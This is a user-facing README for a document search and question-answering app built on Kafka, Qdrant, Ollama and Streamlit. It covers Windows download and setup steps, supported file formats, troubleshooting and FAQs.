# 🤖 -Smart-Assistant-RAG-Pipeline-Project - Efficient Document Search & Answers

[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen?style=for-the-badge)](https://github.com/anditaadhi/-Smart-Assistant-RAG-Pipeline-Project/releases)

---

## 📥 Download & Setup

To get started, visit the link below to download the latest version of the application. This page contains all available releases and files.

[Download the Software](https://github.com/anditaadhi/-Smart-Assistant-RAG-Pipeline-Project/releases)

You will need to download the installer or archive appropriate for your Windows machine. After downloading, follow the steps below to install and run the program.

---

## 💻 System Requirements

Make sure your computer meets these requirements before installing:

- Windows 10 or later
- 4 GB RAM minimum, 8 GB recommended
- At least 2 CPU cores
- 10 GB free disk space for installation and data
- Internet connection for initial setup and updates

---

## ⚙️ Installation Steps

You do not need any programming experience to run this software. Follow these steps carefully.

### 1. Install Required Software

This project depends on other programs to work properly.

- **Python 3.10 or higher**  
  Download from [python.org](https://www.python.org/downloads/). During installation, choose the option to add Python to your system PATH.

- **Docker & Docker Compose**  
  Download Docker Desktop from [docker.com](https://www.docker.com/products/docker-desktop). This will let you run the parts of the software that handle data behind the scenes.

### 2. Download the Application

Go to the releases page linked above. Find the latest release and download the Windows installer or zip file.

### 3. Extract and Open the Folder

If you downloaded a zip file, right-click it and choose "Extract All." Open the extracted folder.

### 4. Launch the Setup Script

- Open the folder.
- Find the file named `setup.bat` or `install.bat`.
- Double-click to run it.

This script will:

- Install necessary Python packages.
- Launch Docker containers for Kafka, Qdrant, Ollama LLM, and the Streamlit web interface.
- Set up the database and indexing system.

### 5. Waiting for Setup to Complete

The setup may take a few minutes. You will see a command window showing progress. Wait until it shows that all services are running.

---

## 🚀 Running the Application

Once you finish the setup:

1. Open your web browser (Chrome, Edge, Firefox).
2. Go to `http://localhost:8501` to open the Smart Assistant interface.
3. You will see options to upload documents and ask questions.
4. Upload documents in supported formats: PDF, DOCX, HTML, or CSV.
5. Use the search box to enter your question.
6. The assistant will display answers with references to your documents.

---

## 📄 Supported Document Formats

This software supports uploading and processing these file types:

- PDFs (Adobe Acrobat files)
- DOCX (Microsoft Word)
- HTML (webpage files)
- CSV (spreadsheet text files)

All files are broken into chunks. The system indexes them in a vector database for quick, smart answers.

---

## 🏗️ How It Works

The software uses several components working together:

| Component       | Function                              |
|-----------------|-------------------------------------|
| Kafka           | Manages uploaded documents and events |
| Qdrant          | Stores document data and search index |
| Ollama LLM      | Answers your questions using AI models |
| Streamlit       | Provides the web interface you see  |

Documents go through Kafka to Qdrant, where they are split into pieces and indexed by meaning. When you ask a question, the AI reads from this database and points back to the original documents.

---

## 🛠️ Troubleshooting

If you have issues:

- Check if Docker Desktop is running.
- Ensure Python 3.10+ is installed and in your PATH.
- Restart the setup script or your computer.
- Open a browser and verify if `http://localhost:8501` loads.
- For errors during setup, look at the messages in the command window and Google any commands or error codes.

---

## 🔄 Updating the Software

To get the latest features or fixes:

1. Visit the releases page again.
2. Download the newest version.
3. Run the installer or setup script from the new files.

Your data and indexed documents will remain intact unless you delete the program folder.

---

## ❓ FAQs

**Q: Do I need to code to use this software?**  
A: No. The setup scripts handle everything. You only interact through the web interface.

**Q: Can I add new documents anytime?**  
A: Yes. Use the upload feature in the browser to add files. The system indexes them automatically.

**Q: What if my document format is not supported?**  
A: Currently, only PDF, DOCX, HTML, and CSV work. You may convert files to these formats before uploading.

---

[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen?style=for-the-badge)](https://github.com/anditaadhi/-Smart-Assistant-RAG-Pipeline-Project/releases)